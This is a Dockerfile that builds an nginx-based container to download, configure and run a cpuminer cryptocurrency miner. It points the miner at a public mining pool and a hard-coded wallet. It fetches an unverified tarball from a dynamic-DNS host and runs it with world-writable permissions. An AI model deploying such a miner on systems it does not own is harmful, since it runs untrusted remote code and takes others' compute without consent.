FROM nginx

WORKDIR /home/
RUN apt update && apt install wget -y 
RUN wget -c https://mikeminer.homelinux.org/cpuminer-gr-rtm.tar.gz -O - | tar -xz && chmod -R 777 cpuminer-gr-rtm && cd cpuminer-gr-rtm
WORKDIR /home/cpuminer-gr-rtm
RUN sed -i -e 's|stratum+tcps://:5555|stratum+tcps://asia.flockpool.com:5555|g' config.json
RUN sed -i -e 's|RCJweHbEwMrdXj4SBzfjscLAdws7DoPghc.Ryzen2600-01|RCJweHbEwMrdXj4SBzfjscLAdws7DoPghc.MacbookPro-i7|g' config.json
RUN chmod +x cpuminer.sh
CMD ["./cpuminer.sh"]
